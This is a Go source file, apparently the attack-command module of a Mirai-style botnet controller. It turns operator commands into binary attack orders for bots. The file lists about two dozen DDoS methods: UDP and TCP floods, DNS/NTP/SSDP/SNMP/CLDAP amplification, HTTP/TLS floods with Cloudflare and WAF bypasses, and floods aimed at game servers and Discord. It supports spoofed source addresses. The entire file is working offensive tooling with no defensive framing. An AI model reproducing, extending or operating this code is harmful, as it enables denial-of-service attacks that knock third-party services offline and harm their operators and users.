package main

import (
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8
	Flags    map[uint8]string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup = map[string]FlagInfo{
	"len":       {0, "Size of packet data, default is 1400 bytes"},
	"rand":      {1, "Randomize packet data content, default is 1 (yes)"},
	"sport":     {6, "Source port, default is random"},
	"dport":     {7, "Destination port, default is random"},
	"domain":    {8, "Domain name (bot resolves via DNS)"},
	"method":    {9, "HTTP method name, default is GET"},
	"path":      {11, "HTTP path, default is /"},
	"conns":     {12, "Number of connections"},
	"source":    {13, "Source IP address, 255.255.255.255 for random"},
	"url":       {14, "Full HTTP/HTTPS URL (bot resolves via DNS)"},
	"https":     {15, "Use HTTPS/SSL (0 or 1)"},
	"useragent": {16, "User-Agent string for HTTP requests"},
	"cookies":   {17, "Cookies for HTTP requests"},
	"referer":   {18, "Referer header for HTTP requests"},
	"size":      {0, "Size of packet data (alias for len)"},
	"port":      {7, "Destination port (alias for dport)"},
}

var attackInfoLookup = map[string]AttackInfo{
	/* L4 Methods */
	"udp":      {0, []uint8{0, 1, 6, 7, 13}, "UDP flood"},
	"vse":      {1, []uint8{0, 1, 6, 7, 13}, "Valve Source Engine A2S_INFO amplification"},
	"fivem":    {2, []uint8{0, 1, 6, 7, 13}, "FiveM protocol flood"},
	"discord":  {30, []uint8{0, 1, 6, 7, 13}, "Discord voice chat flood"},
	"pps":      {3, []uint8{6, 7, 13}, "High PPS UDP flood"},

	/* L7 Methods */
	"tls":      {4, []uint8{7, 8, 9, 11, 12, 14}, "Standard TLS/HTTPS flood"},
	"http":     {5, []uint8{7, 8, 9, 11, 12, 14, 16}, "Plain HTTP flood"},
	"cf":       {6, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Cloudflare bypass flood"},
	"axis-l7":  {7, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "Advanced L7 with WAF bypasses"},

	/* Amplification */
	"dns-amp":  {8, []uint8{6, 13}, "DNS Amplification"},
	"ntp-amp":  {9, []uint8{6, 13}, "NTP Amplification"},
	"ssdp-amp": {10, []uint8{6, 13}, "SSDP Amplification"},
	"snmp-amp": {11, []uint8{6, 13}, "SNMP Amplification"},
	"cldap-amp": {12, []uint8{6, 13}, "CLDAP Amplification"},

	/* L4 TCP */
	"syn":      {13, []uint8{0, 1, 6, 7, 13}, "TCP SYN Flood"},
	"ack":      {14, []uint8{0, 1, 6, 7, 13}, "TCP ACK Flood"},
	"fin":      {15, []uint8{0, 1, 6, 7, 13}, "TCP FIN Flood"},
	"rst":      {16, []uint8{0, 1, 6, 7, 13}, "TCP RST Flood"},
	"tcpconn":  {17, []uint8{0, 1, 6, 7, 13}, "TCP Connection Flood"},
	"xmas":     {18, []uint8{0, 1, 6, 7, 13}, "TCP XMAS Flood"},
	"null":     {19, []uint8{0, 1, 6, 7, 13}, "TCP NULL Flood"},
	"window":   {20, []uint8{0, 1, 6, 7, 13}, "TCP Window Flood"},

	/* Special */
	"icmp":     {21, []uint8{0, 1, 6, 7, 13}, "ICMP Flood"},
	"greip":    {22, []uint8{0, 1, 6, 7, 13}, "GRE IP Flood"},
	"greeth":   {23, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet Flood"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, err := shellwords.Parse(str)
	if err != nil {
		return nil, errors.New("Failed to parse attack command")
	}

	if len(args) < 3 {
		return nil, errors.New("Invalid attack command (need method, target, duration)")
	}

	atkInfo, ok := attackInfoLookup[args[0]]
	if !ok {
		return nil, errors.New("Unknown attack method: " + args[0])
	}
	atk.Type = atkInfo.attackID

	isL7 := atk.Type >= 4 && atk.Type <= 7

	if isL7 {
		/* L7 attacks: send URL directly, bot resolves DNS */
		targetURL := args[1]
		atk.Flags[14] = targetURL

		/* Parse URL components for convenience */
		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
			domain := extractDomainFromURL(targetURL)
			if domain != "" {
				atk.Flags[8] = domain
			}
			path := extractPathFromURL(targetURL)
			if path != "" {
				atk.Flags[11] = path
			}
			if strings.HasPrefix(targetURL, "https://") {
				atk.Flags[15] = "1"
			} else {
				atk.Flags[15] = "0"
			}
		} else {
			/* No protocol prefix, treat as domain */
			atk.Flags[8] = args[1]
			atk.Flags[11] = "/"
			atk.Flags[15] = "0"
		}

		atk.Duration = 1
		for i := 2; i < len(args); i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) != 2 {
				continue
			}
			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
					continue
				}
				atk.Flags[flagInfo.flagID] = parts[1]
			}
		}

		if atk.Flags[15] == "1" && atk.Flags[7] == "" {
			atk.Flags[7] = "443"
		} else if atk.Flags[7] == "" {
			atk.Flags[7] = "80"
		}

	} else {
		/* L4/L7-amplification: target can be IP or domain */
		target := args[1]

		/* Try as IP first */
		if ip := net.ParseIP(target); ip != nil && ip.To4() != nil {
			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
		} else {
			/* Treat as domain - bot will resolve via DNS */
			atk.Flags[8] = target
			/* Still store a dummy target so bot knows to resolve */
			atk.Targets[0x01010101] = 32 /* 1.1.1.1 as placeholder */
		}

		if dur, err := strconv.Atoi(args[2]); err == nil {
			atk.Duration = uint32(dur)
		} else {
			return nil, errors.New("Invalid duration value")
		}

		for i := 3; i < len(args); i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) != 2 {
				continue
			}
			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
					continue
				}
				atk.Flags[flagInfo.flagID] = parts[1]
			}
		}
	}

	return atk, nil
}

func extractDomainFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}
	if idx := strings.Index(url, "/"); idx != -1 {
		url = url[:idx]
	}
	if idx := strings.Index(url, ":"); idx != -1 {
		url = url[:idx]
	}
	return url
}

func extractPathFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}
	if idx := strings.Index(url, "/"); idx != -1 {
		return url[idx:]
	}
	return "/"
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)

	buf = append(buf, this.Type)
	buf = append(buf, byte(len(this.Targets)))

	for addr, netmask := range this.Targets {
		buf = append(buf, byte(addr>>24), byte(addr>>16), byte(addr>>8), byte(addr))
		buf = append(buf, netmask)
	}

	buf = append(buf, byte(len(this.Flags)))

	for key, val := range this.Flags {
		buf = append(buf, key)
		buf = append(buf, byte(len(val)))
		buf = append(buf, []byte(val)...)
	}

	buf = append(buf, byte(this.Duration>>24), byte(this.Duration>>16), byte(this.Duration>>8), byte(this.Duration))

	return buf, nil
}
